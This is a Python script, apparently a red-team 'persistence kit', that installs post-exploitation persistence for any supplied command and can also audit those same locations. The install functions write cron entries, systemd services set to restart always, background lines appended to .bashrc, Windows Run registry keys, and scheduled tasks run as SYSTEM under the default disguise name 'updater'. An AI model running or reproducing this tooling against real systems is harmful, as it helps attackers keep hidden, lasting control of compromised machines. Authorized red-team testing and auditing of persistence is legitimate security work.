#!/usr/bin/env python3
"""
Persistence Kit — Post-Exploitation Persistence Mechanism Installer & Auditor
Installs/audits common persistence mechanisms on Linux and Windows.
Author: Omar Khalid (amooryx) | github.com/amooryx/persistence-kit
AUTHORIZED USE ONLY — for authorized red team engagements.
"""

import argparse
import json
import os
import platform
import subprocess
import sys
import tempfile
from pathlib import Path

IS_LINUX   = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"

def run(cmd: str, check: bool = False) -> str:
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        if check and result.returncode != 0:
            return f"FAILED: {result.stderr[:100]}"
        return result.stdout.strip()
    except Exception as e:
        return f"ERROR: {e}"

# ─── Linux persistence ────────────────────────────────────────────────────────
def install_cron(cmd: str, interval: str = "*/5 * * * *") -> dict:
    """Add a cron job for persistent execution."""
    entry  = f"{interval} {cmd}\n"
    result = run(f'(crontab -l 2>/dev/null; echo "{interval} {cmd}") | crontab -')
    return {"mechanism": "cron", "entry": entry, "result": result}

def install_systemd_service(name: str, cmd: str) -> dict:
    """Create a systemd service for persistence."""
    unit = f"""[Unit]
Description={name}
After=network.target

[Service]
Type=simple
ExecStart={cmd}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    service_path = f"/etc/systemd/system/{name}.service"
    try:
        Path(service_path).write_text(unit)
        run(f"systemctl daemon-reload && systemctl enable {name} && systemctl start {name}")
        return {"mechanism": "systemd", "service": name, "path": service_path}
    except PermissionError:
        # Try user-level systemd
        user_dir = Path.home() / ".config/systemd/user"
        user_dir.mkdir(parents=True, exist_ok=True)
        service_path = str(user_dir / f"{name}.service")
        Path(service_path).write_text(unit)
        run(f"systemctl --user daemon-reload && systemctl --user enable {name}")
        return {"mechanism": "systemd_user", "service": name, "path": service_path}

def install_bashrc(cmd: str) -> dict:
    bashrc = Path.home() / ".bashrc"
    marker = f"# {cmd[:20]}_persist"
    try:
        content = bashrc.read_text() if bashrc.exists() else ""
        if marker not in content:
            with bashrc.open("a") as f:
                f.write(f"\n{marker}\n{cmd} &\n")
        return {"mechanism": "bashrc", "file": str(bashrc), "cmd": cmd}
    except Exception as e:
        return {"mechanism": "bashrc", "error": str(e)}

# ─── Windows persistence ──────────────────────────────────────────────────────
def install_registry_run(name: str, cmd: str, hkcu: bool = True) -> dict:
    hive = "HKCU" if hkcu else "HKLM"
    key  = rf"{hive}\Software\Microsoft\Windows\CurrentVersion\Run"
    result = run(f'reg add "{key}" /v "{name}" /t REG_SZ /d "{cmd}" /f')
    return {"mechanism": f"registry_run_{hive.lower()}", "key": key, "name": name, "result": result}

def install_scheduled_task(name: str, cmd: str, interval_min: int = 5) -> dict:
    result = run(
        f'schtasks /create /sc minute /mo {interval_min} /tn "{name}" '
        f'/tr "{cmd}" /f /ru SYSTEM'
    )
    return {"mechanism": "scheduled_task", "name": name, "result": result}

# ─── Auditor ──────────────────────────────────────────────────────────────────
def audit_linux() -> list[dict]:
    findings = []
    # Check cron
    cron_out = run("crontab -l 2>/dev/null")
    if cron_out:
        findings.append({"source": "cron", "content": cron_out[:500]})
    # Check systemd user units
    user_units = run("systemctl --user list-units --type=service 2>/dev/null")
    if user_units:
        findings.append({"source": "systemd_user", "content": user_units[:500]})
    # Check .bashrc
    for f in [".bashrc", ".bash_profile", ".profile", ".zshrc"]:
        p = Path.home() / f
        if p.exists():
            findings.append({"source": str(p), "content": p.read_text()[:300]})
    # Check /etc/rc.local
    if Path("/etc/rc.local").exists():
        findings.append({"source": "/etc/rc.local",
                         "content": Path("/etc/rc.local").read_text()[:300]})
    return findings

def audit_windows() -> list[dict]:
    findings = []
    for key in [
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
    ]:
        out = run(f'reg query "{key}" 2>nul')
        if out and "ERROR" not in out:
            findings.append({"source": key, "content": out[:500]})
    out = run("schtasks /query /fo LIST /v 2>nul")
    if out:
        findings.append({"source": "scheduled_tasks", "content": out[:2000]})
    return findings

def main():
    parser = argparse.ArgumentParser(
        description="Persistence Kit — Persistence Installer & Auditor (Authorized use only)",
    )
    subparsers = parser.add_subparsers(dest="cmd")

    install_p = subparsers.add_parser("install", help="Install a persistence mechanism")
    install_p.add_argument("--type", choices=["cron", "systemd", "bashrc", "registry", "task"],
                           required=True)
    install_p.add_argument("--name",    default="updater", help="Service/task name")
    install_p.add_argument("--command", required=True, help="Command to persist")
    install_p.add_argument("--out",     help="Output JSON file")

    audit_p = subparsers.add_parser("audit", help="Audit existing persistence mechanisms")
    audit_p.add_argument("--out", help="Output JSON file")

    args = parser.parse_args()
    if not args.cmd:
        parser.print_help()
        sys.exit(1)

    if args.cmd == "install":
        print(f"[*] Installing {args.type} persistence: {args.command}")
        if args.type == "cron":
            result = install_cron(args.command)
        elif args.type == "systemd":
            result = install_systemd_service(args.name, args.command)
        elif args.type == "bashrc":
            result = install_bashrc(args.command)
        elif args.type == "registry":
            result = install_registry_run(args.name, args.command)
        elif args.type == "task":
            result = install_scheduled_task(args.name, args.command)
        else:
            result = {}
        print(f"[+] Installed: {json.dumps(result, indent=2)}")
        if args.out:
            with open(args.out, "w") as f:
                json.dump(result, f, indent=2)

    elif args.cmd == "audit":
        print("[*] Auditing persistence mechanisms ...")
        if IS_LINUX:
            findings = audit_linux()
        else:
            findings = audit_windows()
        print(f"[+] {len(findings)} persistence sources found")
        for f in findings:
            print(f"\n  [{f['source']}]:\n{f['content'][:200]}")
        if args.out:
            with open(args.out, "w") as file:
                json.dump(findings, file, indent=2)

if __name__ == "__main__":
    main()
